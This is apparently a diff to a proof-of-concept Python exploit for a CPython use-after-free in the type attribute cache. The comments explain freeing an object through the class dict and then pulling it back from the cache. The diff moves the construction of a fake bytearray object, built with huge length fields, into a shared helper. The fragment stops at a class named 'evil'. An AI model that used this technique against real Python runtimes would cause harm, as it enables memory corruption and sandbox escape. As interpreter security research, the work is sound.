@@ -29,18 +29,15 @@ mappingproxy_richcompare(PyObject *self, PyObject *w, int op)
 # The attribute cache will not get invalidated if you delete an object via the class dict, so you can add the object to the cache,
 # free the object by deleting it from the dict, then grab it out of the cache. (least contrived python exploit)
 
+# NOTE: this also works with the __ror__ function for the exact same reason as explained above.
+
+from common import evil_bytearray_obj
+
 class bytes_subclass(bytes):
     pass
 
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_obj = (
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) +
-    p64(0)
-)
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, _ = evil_bytearray_obj()
 
 SIZE = 0x100
 class evil:
